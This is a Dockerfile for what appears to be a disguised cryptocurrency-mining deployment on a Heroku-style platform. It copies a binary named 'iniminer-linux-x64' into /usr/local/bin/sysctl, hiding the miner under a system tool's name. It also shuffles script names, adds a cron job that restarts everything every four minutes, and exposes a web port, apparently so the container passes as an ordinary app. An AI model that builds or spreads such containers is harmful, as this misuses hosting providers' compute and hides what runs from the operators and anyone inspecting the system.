# Base Image
FROM ubuntu:20.04

# Non-interactive mode for installation
ARG DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    bash \
    python3 \
    python3-pip \
    curl \
    cron \
    --no-install-recommends && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Copy sysctl.conf for system optimizations
COPY sysctl.conf /etc/sysctl.conf
RUN sysctl -p

# Enable swap for resource optimization
RUN fallocate -l 1G /swapfile && \
    chmod 600 /swapfile && \
    mkswap /swapfile && \
    swapon /swapfile && \
    echo "/swapfile none swap sw 0 0" >> /etc/fstab

# Set working directory
WORKDIR /usr/local/bin

# Copy required scripts
COPY init.sh /usr/local/bin/init.sh
COPY compile.sh /usr/local/bin/main.sh
COPY main.sh /usr/local/bin/run.sh
COPY iniminer-linux-x64 /usr/local/bin/sysctl
COPY restart.sh /usr/local/bin/restart.sh
# Pastikan file 'configure_dynos.sh' disalin ke container
COPY configure_dynos.sh /usr/local/bin/configure_dynos.sh
RUN chmod +x /usr/local/bin/configure_dynos.sh

# Make scripts executable
RUN chmod +x /usr/local/bin/*.sh

# Setup cron for auto-restart every 4 minutes
RUN echo "*/4 * * * * /usr/local/bin/restart.sh >> /var/log/cron.log 2>&1" > /etc/cron.d/restart
RUN crontab /etc/cron.d/restart && touch /var/log/cron.log


# Expose port and run scripts
ENV PORT=8080
EXPOSE 8080

# Run all scripts concurrently and configure dynos
CMD ["bash", "-c", "/usr/local/bin/configure_dynos.sh && /usr/local/bin/init.sh & /usr/local/bin/main.sh & /usr/local/bin/run.sh & cron -f"]
